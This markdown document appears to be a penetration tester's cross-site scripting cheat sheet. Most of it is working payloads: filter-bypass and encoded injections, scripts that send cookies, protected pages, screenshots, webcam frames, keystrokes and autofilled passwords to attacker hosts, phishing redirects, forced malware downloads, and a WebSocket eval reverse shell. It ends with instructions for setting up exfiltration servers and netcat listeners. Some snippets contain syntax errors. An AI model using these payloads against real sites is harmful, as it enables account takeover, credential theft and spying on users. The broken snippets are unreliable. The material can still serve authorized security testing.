Cross Site Scripting (XSS)
==========================

## Overview

Cross Site Scripting or XXS vulnerabilities arise when user controlled data is injected into the DOM in such a way that it is interpreted as JavaScript by the parser resulting in its execution when rendered by the browser. 

## Identification Payloads

### Polyglots

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```


```javascript
jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
```

### Basic Payloads

```js
<script SRC=http://attacker.domain.com/payload.js></script>
```

```js
<img SRC="javascript:alert('XSS');">
```

```js
<iframe src="javascript:alert('xss')">
```

```js
<body oninput=javascript:alert(1)><input autofocus>
```

### Filter Bypass Payloads

#### Script Tag Filtering

```js
<SCRiP/**/t><ScRIpT>alert(1)<ScRiP/**/t></ScRip/**/T>
```

```js
<scr<script>ipt>alert(1)</scr<script>ipt>
```

#### Recursive Script Tag Stripping

```js
<SCR<SCRIPTIPT>alert(1)</SCRIPT>
```

```js
<SCR<SCR<SCRIPTIPT>IPT>alert(1)<</SCRIPT>/SCRIPT>
```

#### Script Content Filtering

```js
<SCRIPT>window.location=atob(base64StringOfAttackSVR)</SCRIPT>
```

#### Case Filtering

```js
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

#### Edgecase Filtering

```js
<<script<sscript+SRC="http://attacker.domain/alert.js"></script>
```

#### No Quotes && Semicolon

```js
<IMG SRC=javascript:alert('XSS')>
```

#### HTML Entities

```js
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
```

#### Grave Accent Obfuscation

+ Hide double and single quotes from filter with grave accent wrapping

```javascript
<IMG SRC=`javascript:alert("Hello, 'XSS'")`>
```

#### Malformed Link Tags `<a>`

```javascript
\<a onmouseover="alert(document.cookie)"\>attacker.domain.com/payload.js\</a\>
```

###### Chrome Edgecase

```javascript
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```

#### Malformed `<img>` tags

```js
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```


### DOM Event Based Payloads

#### Onload

```js
<img onLoad="javascript:alert(1)">
```

```js
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
```

```js
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
```

#### Onerror

```js
<img src=1 href=1 onerror="javascript:alert(1)"></img>
```

```js
<body src=1 href=1 onerror="javascript:alert(1)"></body>
```

```js
<script src=1 href=1 onerror="javascript:alert(1)"></script>
```

#### Onblur

```js
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
```

```js
<input onblur=javascript:alert(1) autofocus><input autofocus>
```

#### OnKeyDown


```js
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
```

#### Onfocus

```js
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
```

### Encoded Payloads


+ alert encode

```
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

+ HTML Decimal Character References

```
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

```
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
```

+ HTML Hexadecimal Character References

```
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```

### JSONP Payloads

+ JSONP callbacks can be weaponised in certain circumstances to get XSS
+ JSONP based XSS vectors also have a high chance of negating CSP protections making them an exceptionally useful vulnerability
+ *Note: the following payloads are designed to be injected into any part of a web application which uses a JSONP endpoint, they can also be injected into the callback of a legitimate JSONP query*
	+ For example: `domain.com/page?query=PAYLOAD`

#### Basic JSONP Payloads

```js
<script src="https://current.domain.com/jsonp_endpoint.jsonp?callback=alert(1);"></script>
```

### Image/File Upload Based Payloads

#### File Name Injection

+ Upload a file like

```javascript
""><img src=x onerror=alert(1)>.gif
```

#### SVG 

```javascript
<?xml version="1.0" standalone="no"?>
<svg width="1056" height="816" xmlns="http://www.w3.org/2000/svg" onload="alert(1)" id="svgvm7">
<g transform="translate(5,5)" style="font-family: sans-serif;"><g><g transform="translate(0, 0)">
```

#### CSV

```javascript
</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>”
```

#### File Metadata

*These can be embeded with exiftool and hence an example command for doing so is included.*

```javascript
“><img src=1 onerror=alert(alert(1))>’ payload_file.jpeg
```

**Usage**

`exiftool -Artist='PAYLOAD'`

#### GIF

`GIF89a/*<svg/onload=alert(1)>*/=alert(1)//;`


## Exploit Payloads

JS code for embedding in exploit payloads.

### Phishing Redirect

```javascript
window.location='https://attackerphishingsite.com'
```

```javascript
window['location']='https://attackerphishingsite.com'
```

```javascript
document.location='https://attackerphishingsite.com'
```

### Exfiltrate Auth Tokens/Cookies

*For use with an [exfiltration/attack server](#exfiltration-servers)*

```javascript
fetch('attack.domain.com?cookie=${encodeURIComponent(document.cookie)}')
```

```javascript
window.location = "http://attack.svr?stolen_token=" + document.cookie;
```

```javascript
window['location'] = "http://attack.svr?stolen_token=" + document['cookie'];
```

```javascript
document.location = "http://attack.svr?stolen_token=" + document.cookie";
```

```javascript
document['location'] = "http://attack.svr?stolen_token=" + document['cookie'];
```

```javascript
let req = new XMLHttpRequest();res.open('GET', 'http://attack.svr?stolen_token=' + document.cookie);req.send();
```

```javascript
document.write(<img src="http://attack.svr?cookie=" + document.cookie>);
```

### Grab Protected Pages


```javascript
fetch('/protected_page')
	.then(page => page.text())
	.then(text => 
		fetch('attack.domain.com', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({page:text})
		})
	)
```

### Grab Specific Page Data

*For use with an [exfiltration/attack server](#exfiltration-servers)*

#### Page Area {div, span, etc}

```javascript
fetch('attacker.domain.com?data=' + encodeURIComponent(document.querySelector('.hmtlClassElmentToSteal').textContent))
```

#### Input Field/Text Area

```javascript
fetch('attacker.domain.com?data=' + encodeURIComponent(document.querySelector('.hmtlClassElmentToSteal').textValue))
```

### Grab Screenshots

```javascript
<script src=https://html2canvas.hertzen.com/dist/html2canvas.min.js>
html2canvas(document.body)
	.then(canvas => 
			fetch('attack.domain.com', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' }
					body: JSON.stringify({img: canvas.toDataURL()})
			})
		)
</script>
```

### Forced Download

*For use with an [exfiltration/attack server](#exfiltration-servers)*

#### Macro Document

```javascript
frame = document.createElement('iframe')
frame.src = 'attack.domain.com/payloadDocument.docx'
document.body.appendChild(frame)
```

#### Executable File

```javascript
<a href=/executable.exe download=executable.exe onclick="if(window.el){return;}el=this;
	fetch('attack.domain.com/payload.exe')
		.then(resp => resp.blob())
		.then(blob => 
			{
				el.href=window.URL.createObjectURL(blob); el.click()
			});
			
			return false">
			Social Engineering TXT here
</a>
```


### Capture Data From Webcam

*For use with an [exfiltration/attack server](#exfiltration-servers)*

```js
vid_element = document.createElement('video')
navigator.mediaDevices.getUserMedia({video:true})
	.then(stream => {
		vid_element.srcObject = stream
		vid_element.play()
		setTimeout(()) => {
			canvas = document.createElement('canvas')
			canvas.width = vid_element.videoWidth
			canvas.height = vid_element.videoHeight
			canvas.getContext('2d').drawImage(vid_element,0,0)

			fetch('attack.domain.com', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({img: canvas.toDataURL()})
				})
		}, 2000)
	});
```

### Reverse Shell

*For use with an [exfiltration/attack server](#exfiltration-servers)*

```js
sock = new WebSocket('wss://attack.domain.com')
sock.onmessage = event => eval(e.data)
```

### Run Keylogger

*For use with an [exfiltration/attack server](#exfiltration-servers)*

```js
document.addEventListener('change', element => {
		if(!element.target.matches('input, textarea')) return
		fetch('attack.domain.com', {
				method: 'POST',
				headers: { 'Content-Type:' 'application/json' },
				body: JSON.stringify({key: element.target.value})
			})
	});
```

### Steal Saved Browser Credentials

```js
form = document.createElement('form')
usr_name = document.createElement('input')
usr_name.setAttribute('type', 'text')
usr_name.setAttribute('name', 'username')

password = document.createElement('input')
password.setAttribute('type', 'password')
password.setAttribute('name', 'password')

form.appendChild(usr_name)
form.appendChild(password)
document.body.appendChild(form)
document.addEventlistener('click', () =>
	fetch(`attack.domain.com?usr=${usr_name.value}pass=${password.value}`)
);
```

## Exfiltration Servers

This section aims to document several approaches to setting up an attack server for XSS exfiltration 

### [AWS EC2 Instance](https://us-east-2.console.aws.amazon.com/ec2/)

+ Amazons EC2 instances are my personal go to

**Pros**

+ Free under a certain threshold which is more than adequate for an exfiltration server
	+ 30 GB disk
	+ 1 CPU
+ Public IPv4 address 
+ Possible to configure a IPv6 address also
+ Fast to connect, little machine configuration required
	+ Can all be done through management console

**Cons**

+ HTTPs server configuration is more fiddly
+ Listeners need to be setup manually


**Usage**

+ Spin up a linux instance (Ubuntu, Fedora, etc)
+ Open ports for http listener traffic (ie 8888)
+ Follow connect tab instructions (Connect > ssh key.pem)
+ Start listener
+ Point payloads to instances public IP
     

### [Pipedream.com](https://pipedream.com)

+ Another personal favorite

**Pros**

+ Nearly zero setup, just make an account and start a webhook
+ Free for anyone
+ Clean UI
+ No configuration for HTTP or HTTPs

**Cons**

+ Not as flexible as a server

**Usage**

+ Point scripts to webhook address (https://uniquestr.m.pipedream.net)

### [Ngrok](https://ngrok.com/)

+ 'Secure' tunnel to localhost

**Pros**

+ Get requests right in your terminal
+ Http and https mirrors
+ Custom ports

**Cons**

+ Bit sketch
+ Points to your machine

### [Digital Ocean Droplets](https://cloud.digitalocean.com/droplets) 

**Pros**

+ Get $100 credit for free as a student
+ Lowest tier machine is more than adequate
+ Simple setup
+ Public IPv4 and IPv6 

**Cons**

+ $5 per month for lowest tier is steep

**Usage**

+ Spin up a linux droplet (Ubuntu, Fedora, etc)
+ Ssh to droplets public IP
+ Start listener
+ Point payloads to instances public IP

### Listners

#### NC

`$ nc -l port`

`$ netcat -l port`

#### Python Simple HTTP

`$ python -m http.server port`
     


## Debugging Payloads

### Payload Doesn't Work 

+ If your payload doesn't work after finding a injection point vulnerable to a basic test 
these are some common reasons payloads fail

#### Browser/Web Application Encoding

+ More built out payloads which contain urls and additional JS code generally contain a number of characters which browsers and 
parts of web applications interpret as delimiters or other characters
+ A common example of this is when injecting payloads into felids on a web app or the address bar which contain the `+` character commonly used to concatenate strings in JS,
the `+` character in many cases will be 'transformed' into a `space` character consequently breaking the JS syntax and your payload

##### Common 'Bad/interpreted Characters'

```
| Interpreted Character | URL Encoding (Patch) |
|-----------------------|----------------------|
| +                     | %2B                  |
| /                     | %2F                  |
| '                     | %27                  |
| "                     | %22                  |
| space                 | %20                  |
| #                     | %23                  |
```

**Checking Character Encoding**

+ In Burpsuite use the decoder tab
+ Python3 `$ python3 >> hex(ord("char"))`
	+ To check `"` use `\"`

#### Exploit Works Locally (My browser) but Not On Other Users

+ Sometimes XSS payloads which work from the injected browsers perspective do not trigger when sent to a victim
+ This can occur due to browser type
	+ Chrome
	+ Safari
	+ Edge
	+ Firefox
+ Browser version
+ Browser plugins

###### Workarounds

+ Test payloads on other browsers
+ **Try alternative JS syntax**
+ Try alternative HTML tags/attributes
+ Check W3C and other online resources to see what browsers support elements of your payload

### General Tips

+ Inject payloads through burp where possible to observe if they are encoded correctly
+ Check the dev console after injecting a payload
	+ Look for CSP blocks
	+ Syntax errors
+ Check the DOMs interpretation of the payload with inspect/view source

### Unsorted Workarounds

+ Try double URL encoding bad characters
+ Base 64 encode long strings and then use the JS `atob(string)` in the payload body to decode the string back to plain text 
+ Add or remove `;//` after url strings 

## Finding and Exploiting XSS

#### DOM Based XSS

- [ ] Do forms/fields on the web app return user entered data on the page?
- [ ] How does the form/field handle control characters? Does the application error?
- [ ] Are control characters encoded, escaped, filtered, blocked or rendered?
- [ ] Does any kind of filter evasion yield variations?

#### Reflected XSS

- [ ] Are felids/forms processed by the web application before the response is supplied to the client/frontend?
- [ ] Is the form validated on the front end?
- [ ] Can form validation be bypassed?
- [ ] How does the server respond to control characters supplied to the felid/form?
- [ ] Are control characters encoded, escaped, filtered, blocked or rendered in the return data?
- [ ] Does any kind of filter evasion yield variations?

#### Stored XSS

- [ ] Does user/client controlled field/form data get stored by the server for use in rendering content on the web application?
- [ ] Is the form validated on the front end?
- [ ] Can form validation be bypassed?
- [ ] How does the server respond to control characters supplied to the felid/form?
- [ ] How does the frontend render client data injected with control characters, are they stripped, malformed, encoded or rendered?
- [ ] Does any kind of filter evasion yield variations?  


## Resources

+ [Portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#client-side-template-injection)
+ [OSWAP Cheat-sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+ [GBHackers Top 500 XSS Cheat sheet](https://gbhackers.com/top-500-important-xss-cheat-sheet/)
+ [Chef Secure](https://www.youtube.com/channel/UCqx-vnWwxXQEJ0TC5a6vuNw)
